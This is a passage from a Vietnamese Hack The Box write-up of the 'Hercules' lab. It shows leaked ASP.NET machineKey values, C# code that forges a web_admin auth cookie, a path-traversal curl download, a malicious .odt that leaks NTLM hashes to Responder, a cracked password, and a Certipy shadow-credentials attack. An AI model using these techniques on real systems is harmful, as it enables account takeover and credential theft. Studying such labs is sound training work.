    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->**
```

Quan sát lại request thì xuất hiện 1 cookie lạ 

```
**.ASPXAUTH=4FC3B8AD788B38BC536345266F5B5D411622B7F250F3619A59541E0716FC0F363F4001BC851426274FFB02CA6D9411A00792FAD6E57250A75DE470FC82042E216670598FFE9951118F596BB95CF68496E9F186B74CE48FCA2EA4D89AFC6A491755A6E143DC00995AA9EDFA54564F4384D70DF6FBDB6325C822336A81529F095E9B7D712850856A67647063C3A98B78928DF0145FF30A9FBFD98023401C479E97S**
```

Sau khi search và hỏi AI về cookie **`.ASPXAUTH`** thì trường này dùng để xác định user nếu user đã tương tác với trang login (đã authenticate)

- [[MS-TSWP]: .ASPXAUTH Cookie | Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tswp/fd02fed4-7bab-4d3e-a7a1-639d4838d7ca)

![image](/assets/images/HTB/season9/Hercules/image%2030.png)

Một số thông tin của **`web.config`** thì xác định được **ASP .NET MVC 5 web application** 

```markdown
 **<assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
	  <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />**
```

Và nó dùng .**NET Framework 4.8,** với form-based authentication và HTTPS redirection. 

```xml
**<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />**
```

Theo tác giả **`0xdf`** , thì có nói về [https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis) của machine [https://0xdf.gitlab.io/2022/10/15/htb-perspective.html](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html) 

→ Thì được biết đây là key dùng để encrypt/decrypt forms Auth cookies và cũng validate [ViewState](https://learn.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)), token chống giả mạo. 

![image](/assets/images/HTB/season9/Hercules/image%2031.png)

### Encrypt/Decrypt Cookie

---

Từ bài blog của **`0xdf`** thì mình tìm được tool này [**aspnetCryptTools**](https://github.com/liquidsec/aspnetCryptTools)

![image](/assets/images/HTB/season9/Hercules/image%2032.png)

Sau khi chạy thì hoàn toàn bị lỗi. 

Cho nên mình cần tìm kiếm 1 tool nào đó khác → thì mình tìm ra tool này:

- https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat/

Nó hoàn toàn phù hợp với **`asp.net`** , mà ko phụ thuộc vào **`system.web`** 

Đầu tiên mình cần làm là tạo ra 1 folder tên là **`LagacyAuthConsole`:**

![image](/assets/images/HTB/season9/Hercules/image%2033.png)

Tiếp theo, mình cần thêm package với compact version mà có thể chạy trên target. 

![image](/assets/images/HTB/season9/Hercules/image%2034.png)

Sau đó, mình cần restore nó lại. 

![image](/assets/images/HTB/season9/Hercules/image%2035.png)

Và cần chỉnh sửa lại file **`Program.cs`** , này để có thể phù hợp cho việc decrypt.

```vbnet
**using System;
using System.Security.Claims;
using System.Threading.Tasks;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
      string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
      string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

      byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
      byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

      var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);

      FormsAuthenticationTicket decryptedTicket = legacyFormsAuthenticationTicketEncryptor.DecryptCookie("4FC3B8AD788B38BC536345266F5B5D411622B7F250F3619A59541E0716FC0F363F4001BC851426274FFB02CA6D9411A00792FAD6E57250A75DE470FC82042E216670598FFE9951118F596BB95CF68496E9F186B74CE48FCA2EA4D89AFC6A491755A6E143DC00995AA9EDFA54564F4384D70DF6FBDB6325C822336A81529F095E9B7D712850856A67647063C3A98B78928DF0145FF30A9FBFD98023401C479E97");
      Console.WriteLine(decryptedTicket.Version);
      Console.WriteLine(decryptedTicket.Name);
      Console.WriteLine(decryptedTicket.IssueDate);
      Console.WriteLine(decryptedTicket.Expiration);
      Console.WriteLine(decryptedTicket.IsPersistent);
      Console.WriteLine(decryptedTicket.UserData);
      Console.WriteLine(decryptedTicket.CookiePath);
      Console.ReadLine();
    }
}**

```

Sau đó,  mình chạy tool → nó decrypt được như sau:

![image](/assets/images/HTB/season9/Hercules/image%2036.png)

Và nếu hoàn toàn decrypt được thì cũng hoàn toàn có thể encrypt được → mình sẽ cần encrypt để leo lên user **`web_admin` →** chỉnh sửa lại file **`Program.cs`** 

```vbnet
**using System;
using System.Security.Claims;
using System.Threading.Tasks;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
      string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
      string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

      var issueDate = DateTime.Now;
      var expiryDate = issueDate.AddHours(1);
      var formsAuthenticationTicket = new FormsAuthenticationTicket(1, "web_admin", issueDate, expiryDate, false, "Web Administrators", "/");

      byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
      byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

      var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);

      var encryptedText = legacyFormsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);

      Console.WriteLine(encryptedText);
    }
}**
```

Nó sinh ra được 1 cookie như sau: 

![image](/assets/images/HTB/season9/Hercules/image%2037.png)

Copy nó và dán vào cookie. 

![image](/assets/images/HTB/season9/Hercules/image%2038.png)

Như vậy mình đã leo lên được **`web_admin` → tìm kiếm trên user này.** 

![image](/assets/images/HTB/season9/Hercules/image%2039.png)

Mục này mình có hai mail

- Security Audit
    
    ![image](/assets/images/HTB/season9/Hercules/image%2040.png)
    
    Chú ý đến item 4 là **`Restrict file upload to administrators only`** → mà mình đang là **`web_admin`** → hoàn toàn upload file.
    
- Password Reset??
    
    ![image](/assets/images/HTB/season9/Hercules/image%2041.png)
    
    Ở đây thì khá giống như một kỹ thuật social engineering → nên mình skip qua. 
    

Giờ thì mình back lại endpoint **`/Forms`** , nơi cho mình upload file.

### Upload File

---

Mình sẽ thử upload 1 file hình ảnh như **`.png`** lên xem như thế nào. 

![image](/assets/images/HTB/season9/Hercules/image%2042.png)

Thì nó ko cho phép. Cho nên giờ mình cần fuzz xem đuôi file nào nó cho phép. 

![image](/assets/images/HTB/season9/Hercules/image%2043.png)

Sau khi scan thì kết quả như sau: 

![image](/assets/images/HTB/season9/Hercules/image%2044.png)

Chú ý là mình thấy nó cho phép upload file **`.docx`** , nhưng mà việc reverse shell bằng file **`.docx`** thì cũng khó và thường là sẽ dùng **`macro`** để thực hiện. 

Cho nên mình quay lại chỗ **`Path Traversal`**  xem có đọc được gì ko ???? 

Giờ thì mình cần tìm hiểu cấu trúc của Razor Pages này. Xem coi nó có gì trong đấy!!

![image](/assets/images/HTB/season9/Hercules/image%2045.png)

- [Views in ASP.NET Core MVC | Microsoft Learn](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/overview?view=aspnetcore-9.0)

Như vậy nếu mình đoán được **`/Forms`**  đặt tên như thế nào thì mình hoàn lấy được source 

![image](/assets/images/HTB/season9/Hercules/image%2046.png)

Dựa vào tên chức năng thì mình mạnh dạng đoán tên file **`Forms.cshtml`** :)))) 

```vbnet
**@model HadesWeb.Models.UploadFormModel
@{
    ViewBag.Title = "Forms";
    Layout = "_Layout.cshtml";
}

@using (Html.BeginForm("Forms", "Home", FormMethod.Post, new { enctype = "multipart/form-data", @class = "upload-form-container" }))
{
    @Html.AntiForgeryToken()
    @Html.ValidationSummary(true, "", new { @class = "text-danger" })

    <div class="title-container">
        <h2>Report Submission</h2>
        <button type="button" class="info-button" onclick="openModal('infoModal')">?</button>
    </div>

    <div id="infoModal" class="upload-form-modal">
        <div class="upload-form-modal-content">
            <span class="close" onclick="closeModal('infoModal')">&times;</span>
            <h3>Form Information</h3>
            <p>
                We're sorry that you're experiencing any issues. Our team aims to provide the best assistance where we can.<br /><br />You can use the form below to report your issue. A member of our team will typically respond to your report within a couple of minutes, so please be patient!
            </p>
        </div>
    </div>

    <div class="upload-form-group-horizontal">
        <div class="upload-form-group">
            @Html.LabelFor(m => m.Name, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.Name, new { @class = "upload-form-textarea" })
            @Html.ValidationMessageFor(m => m.Name, "", new { @class = "text-danger" })
        </div>

        <div class="upload-form-group">
            @Html.LabelFor(m => m.Email, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.Email, new { @class = "upload-form-textarea" })
            @Html.ValidationMessageFor(m => m.Email, "", new { @class = "text-danger" })
        </div>
    </div>

    <div class="upload-form-group">
        @Html.LabelFor(m => m.Description, new { @class = "upload-form-label" })
        @Html.TextAreaFor(m => m.Description, new { @class = "upload-form-textarea", rows = "4" })
        @Html.ValidationMessageFor(m => m.Description, "", new { @class = "text-danger" })
    </div>

    <div class="upload-form-group-horizontal">
        <div class="upload-form-group">
            @Html.LabelFor(m => m.UploadedFile, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.UploadedFile, new { type = "file" })
            @Html.ValidationMessageFor(m => m.UploadedFile, "", new { @class = "text-danger" })
        </div>

        <div class="upload-form-group">
            <div class="upload-submit-form">
                <button class="upload-form-button" type="submit">Submit</button>
                <div class="upload-viewbag-message">
                    @ViewBag.Message
                </div>
                <div class="upload-viewbag-success">
                    @ViewBag.Success
                </div>
            </div>
        </div>

    </div>
}

<script src="~/Content/js/modal.js"></script>**
```

Dựa vào file này thì mình đưa cho AI hỏi xem để xem có xác định được cấu trúc project ko 

```vbnet
**HadesWeb/
│
├── App_Start/
│   ├── RouteConfig.cs
│   ├── BundleConfig.cs
│   ├── FilterConfig.cs
│
├── bin/
│   ├── HadesWeb.dll
│   ├── HadesWeb.pdb
│   └── các thư viện bên thứ 3
│
├── Content/
│   ├── css/
│   │     site.css
│   │     form.css
│   │     modal.css
│   ├── images/
│   └── js/
│         modal.js   ← View bạn dùng file này
│
├── Controllers/
│   ├── HomeController.cs   ← chắc chắn có
│   └── (có thể thêm: AccountController, AdminController…)
│
├── Models/
│   ├── UploadFormModel.cs   ← chắc chắn có
│   └── các model khác
│
├── Views/
│   ├── Home/
│   │    Forms.cshtml        ← file bạn đưa
│   │    Index.cshtml
│   │    (có thể có: About.cshtml, Contact.cshtml)
│   │
│   ├── Shared/
│   │    _Layout.cshtml      ← được gọi từ Forms.cshtml
│   │    _ViewStart.cshtml
│   │    _ViewImports.cshtml (tùy)
│   │
│   └── Web.config  (web.config dành riêng cho Views)
│
├── Global.asax
├── Global.asax.cs
│
├── HadesWeb.csproj
│
├── favicon.ico
│
├── packages.config (nếu project dùng NuGet kiểu truyền thống)
│
└── Web.config (file cấu hình chính)**

```

Từ đây mình có: 

- **`@model HadesWeb.Models.UploadFormModel`** : điều này chỉ ra (data structure) cho thấy và được đặt tại **`HadesWeb.dll` → `Models`** namespace **→ `UploadFormModel`**  class.
- Form Action **`Html.BeginForm("Forms", "Home", FormMethod.Post,...)` :** Submit tới **`POST /Home/Forms`** và được handle bởi **`HomeController.Forms()`** method (do quy tắc đặt tên trong ASP.NET)

Mình cần decompile **`HadesWeb.dll`** vì cái này chứa logic, bộ điều khiển, mô hình của ứng dụng và các chế độ xem hoặc trang có thể được biên dịch trước. 

> Và giờ mình phải hỏi là file **`HadesWeb.dll`** nằm tại đâu?
> 

Thì theo AI ở trên thì nó nằm tại folder **`bin`** → nhưng mà để chắc chắn thì cũng search cấu trúc vì AI ko phải lúc nào cũng đúng :”>

Sau khi tìm kiếm thì mình thu được thông tin này 

![image](/assets/images/HTB/season9/Hercules/image%2047.png)

Tìm kiếm về folder **`/bin`**  thì nó thông báo như sau: 

- [ASP.NET Web Site Layout | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/aspnet/ex526337(v=vs.100)#application-folders)

![image](/assets/images/HTB/season9/Hercules/image%2048.png)

Nó định nghĩa rằng **“Contains compiled assembiles (.dll files)”** nghĩa là tất cả đã compile rồi sẽ nằm tại **`/bin`** như vậy **`HadesWeb.dll`** cũng nằm tại đây. 

⇒ Từ đây mình cần decompile lại rồi sau đó đọc qua Path Traversal. 

```bash
**┌──(kali㉿kali)-[~/Desktop]
└─$ COOKIE="__RequestVerificationToken=LV4ZceLBdgdm5w74Q08KNwdhmeEX2zzhyrWVFVkJxF5w3ct2z54SO4khSI9H95tugd8QLz67u0ruJAk5x7G1wVY2FR-1-VJL_U_Ijqbl9as1"
                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ TARGET="https://hercules.htb/Home/Download"
                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -sk -H "COOKIE: $COOKIE" \ 
> "${TARGET}?fileName=../../bin/HadesWeb.dll" \
> -o HadesWeb.dll**
```

Từ đây mình cần decomplie lại bằng tool này: 

- https://github.com/dnSpy/dnSpy

Sau khi clone về thì mình chạy như sau: 

```bash
**┌──(kali㉿kali)-[~/Desktop/tool_window/ASPNET/decomplieDotNet]
└─$ wine dnSpy.exe HadesWeb.dll**
```

Khi nó chạy thì sẽ hiển thị như này → thì nó lã lỗi chứ ko phải chức năng :D 

![image](/assets/images/HTB/season9/Hercules/image%2049.png)

Cho nên mình chuyển sang tool này: 

- https://github.com/icsharpcode/AvaloniaILSpy

```bash
**┌──(kali㉿kali)-[~/Desktop/tool_window/ASPNET/decomplieDotNet]
└─$ cd ilSpy

┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
└─$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip

┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
└─$ unzip Linux.x64.Release.zip 
Archive:  Linux.x64.Release.zip
  inflating: ILSpy-linux-x64-Release.zip  
                                                                                                                      
┌──(kali㉿kali)-[~/…/tool_window/ASPNET/decomplieDotNet/ilSpy]
└─$ unzip ILSpy-linux-x64-Release.zip

┌──(kali㉿kali)-[~/…/decomplieDotNet/ilSpy/artifacts/linux-x64]
└─$ ./ILSpy ~/Desktop/HadesWeb.dll**
```

![image](/assets/images/HTB/season9/Hercules/image%2050.png)

Nhìn thấy thì nó còn cho phép **`.odt`** và lưu lại tại **`C:\\inetpub\\Reports\\`** 

> Thật ra thì khi mình bruteforce extension đựa vào đây thì cũng có thể tìm ra.
> 
- [https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4](https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4)

### `.odt`

Về file **`.odt`** được viết tắt là OpenDocument Text, là tập định dạng tài liệu xử lý văn bản có nguồn mở và có thể so sánh với định dạng **`DOCX`** của Microsoft Word.

Sau khi tìm kiếm về **`.odt cve`** thì có một vài cách tạo file độc hại.

→ Mình có [**LibreOffice/Open Office-’.odt’ Information Disclosure**](https://www.exploit-db.com/exploits/44564) từ **exploit-db**. 

Đọc qua thì mình có thể hiểu là tạo ra **1 file ODF** độc hại có thể được dùng để leak **NetNTLM credentials**. 

⇒ Mình tìm ra 1 script được viết sẵn như sau [**Bad-ODF**](https://github.com/lof1sec/Bad-ODF). 

```bash
**┌──(badodf-env)─(kali㉿kali)-[~/Desktop/Malicious_ODF_File_Creator]
└─$ pip install ezodf && pip install --upgrade lxml

                                                                                                                          
┌──(badodf-env)─(kali㉿kali)-[~/Desktop/Malicious_ODF_File_Creator/Bad-ODF]
└─$ python3 Bad-ODF.py                             
/home/kali/Desktop/Malicious_ODF_File_Creator/Bad-ODF/Bad-ODF.py:29: SyntaxWarning: invalid escape sequence '\/'
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     

Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk

Please enter IP of listener: 10.10.16.183**
```

Như vậy là mình đã tạo ra 1 file **`bad.odt`** có chứa ip của attacker. 

→ Dùng **`responder`** để bắt lấy **`NTLM`** 

```bash
**┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.183]
    Responder IPv6             [dead:beef:4::10b5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-FG0OKCTUFDH]
    Responder Domain Name      [FTEP.LOCAL]
    Responder DCE-RPC Port     [45094]

[+] Listening for events...**              
```

Giờ thì mình tiến hành upload cái file độc hại lên. 

![image](/assets/images/HTB/season9/Hercules/image%2051.png)

Mình thu được 1 tài khoản như sau: 

![image](/assets/images/HTB/season9/Hercules/image%2052.png)

Cho nên giờ thì mình cần crack cái hash này. 

![image](/assets/images/HTB/season9/Hercules/image%2053.png)

Mình thu được 1 credentials mới nữa **`natalie.a:Prettyprincess123!`**

Tới đây thì mình dùng tool **`bloodhound`** 

### `Bloodhound`

![image](/assets/images/HTB/season9/Hercules/image%2054.png)

Sau khi chạy xong thì mình thu được các file như sau. 

![image](/assets/images/HTB/season9/Hercules/image%2055.png)

Sau khi có được 1 đóng data này thì mình tool [**Blood Legacy v4.3.1](https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1)** thì để tổng hợp. Lệnh chạy là **`./BloodHound --no-sandbox --disable-gpu`** 

Một hồi mày mò thì mình đã mở ra được → upload những file này vào. 

![image](/assets/images/HTB/season9/Hercules/image%2056.png)

Bắt đầu từ user **NATALIE.A** đầu tiên. 

![image](/assets/images/HTB/season9/Hercules/image%2057.png)

Mình nhìn thấy **`natalie.a`** là một thành viên của **`WEB SUPPORT@HERCULES.HTB`** 

Vậy giờ mình check thử cái node này. 

![image](/assets/images/HTB/season9/Hercules/image%2058.png)

**`WEB SUPPORT@HERCULES.HTB`** có **`GenericWrite`** 6 users → **`web_admin`** , **`ken.w`** , **`johnathan.j`** , **`harris.d`** , **`ray.n`** , và **`bob.w`**

Giờ thì mình cần nhìn cái nhìn tổng quát bằng cách là nhìn **Short Path** để nhìn thấy 1 cách tổng quát nhất → để xây dựng kế hoạch attack típ.

![image](/assets/images/HTB/season9/Hercules/image%2059.png)

Mình thấy rõ rằng user tiềm năng mà liên kết với mục tiêu **`mark.s`** và **`stephen.m`** là thành viên của **`SECURITY HELPDESK@HERCULES.HTB`** mà có thể **`ForceChangePassword`** tới **`Auditor`** .

Và **`HELPDESK ADMINISTRATORS@HERCULES.HTB`** cũng có thể **`ForceChangePasswrod`** tới **`ashley.b`** 

![image](/assets/images/HTB/season9/Hercules/image%2060.png)

Và có thể mục tiêu cuối cùng là **`IIS_WEBSERVER$@HERCULES.HTB`** mà có thể **`AllowedToAct`** thẳng tới **`DC.HERCULES.HTB`** mà có thể **`DCSync`** tới **`HERCULES.HTB`** 

Nhìn thấy thì có users hoặc 1 group được xác định là dấu **`?`** cho nên mình cần khám phá nó. 

Mình sẽ tiếp tục lấy thông tin chung chung về các nhóm. 

![image](/assets/images/HTB/season9/Hercules/image%2061.png)

Mình có **`SECURITY HELPDESK@HERCULES.HTB`** có **`ForceChangePassword`** tới 7 users → **`auditor`** , **`angelo.o`** , **`stephen.m`** , **`nata.h`** , **`vincent.g`** , **`elijah.m`** và **`mark.s`** 

Check **`Auditor`** thì là thành viên của 1 trong 4 groups

![image](/assets/images/HTB/season9/Hercules/image%2062.png)

- **`Domain Users`**
- **`Domain Empoyees`**
- **`Forest Management`**
- **`Remote Management Users`**

Nhóm **`Remote Management Users`** lại có hai user là **`ashley.b`** và **`auditor`** → có nghĩa là 2 hai user này có thể dùng remote trong những cái session làm việc của họ.

![image](/assets/images/HTB/season9/Hercules/image%2063.png)

Và trong group **`Forest Management`** và mình có thể đoán là trong này có thể có thêm 1 DC hoặc một vài source ADCS attack liên quan đến 1 vài certificate mà mình cần để giải quyết.

→ Từ đây thì mình có 1 vài ý, mình có thể bắt đầu overview con đường mà có thể xuất phát từ **`mark.s`** hoặc **`stephen.m`** để tới mục tiêu **`Auditor`** , sau đó nhắm tới mục tiêu là **`ashley.b`** và **`iis_webserver$`** sẽ là mục tiêu cuối cùng. 

Giờ thì mình quay lại với user **`natalie.a`** 

![image](/assets/images/HTB/season9/Hercules/image%2064.png)

Có thể nói rằng **`natalie.a`** là thành viên của **`WEB SUPPORT@HERCULES.HTB`** group và group này thì có **`GenericWrite`** tới **`bob.w`** → vậy thì mình bắt đầu từ đây. 

Thật ra thì mình cũng ko biết **`GenericWrite`** là gì ?? 

![image](/assets/images/HTB/season9/Hercules/image%2065.png)

Cho nên mình trỏ tới rồi right click với thuộc tính. 

![image](/assets/images/HTB/season9/Hercules/image%2066.png)

→ Ở đây mình cũng tìm ra [**shadow-credentials**](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) thì có nhiều cách. 

> Kiểm tra [**shadow-credentials-attack**](https://www.hackingarticles.in/shadow-credentials-attack/) để tìm hiểu thêm nhiều cách attack.
> 

Mình thử bắt đầu request 1 TGT kerberos cho **`nataile.a`** 

```bash
**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -k hercules.htb/natalie.a:'Prettyprincess123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache**
```

Giờ thì mình set 1 ticket mới. 

```bash
**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ export KRB5CCNAME=natalie.a.ccache
                                                                                                                          
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ klist 
Ticket cache: FILE:natalie.a.ccache
Default principal: natalie.a@HERCULES.HTB

Valid starting       Expires              Service principal
11/30/2025 08:03:20  11/30/2025 18:03:20  krbtgt/HERCULES.HTB@HERCULES.HTB
        renew until 12/01/2025 08:03:15**
```

Sau đó mình dùng tool [**Certipy**](https://github.com/ly4k/Certipy) để thực hiện shadow-credentials attack để có được hash của **`bob.w`** 

- https://github.com/ly4k/Certipy

```bash
**┌──(certipy-env)─(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -account bob.w
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e2d44f56-b727-f097-aa1b-b70631a6ab14'
[*] Adding Key Credential with device ID 'e2d44f56-b727-f097-aa1b-b70631a6ab14' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID 'e2d44f56-b727-f097-aa1b-b70631a6ab14' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[-] Error writing output file: [Errno 13] Permission denied: 'bob.w.ccache'. Dumping to stdout instead
[-] Use -debug to print a stacktrace
